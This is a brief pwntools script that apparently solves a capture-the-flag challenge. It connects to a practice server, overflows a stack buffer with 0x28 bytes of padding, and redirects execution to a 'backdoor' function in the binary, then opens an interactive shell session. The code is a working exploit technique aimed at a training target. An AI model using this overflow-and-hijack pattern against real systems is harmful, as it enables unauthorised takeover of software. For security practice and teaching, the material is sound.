from pwn import *

io = remote('node4.buuoj.cn', 28674)
elf = ELF('./pwn')
backdoor = elf.symbols['backdooOo0r']
payload = b'a'*(0x20+0x8) + p64(backdoor)
io.sendline(payload)
io.interactive()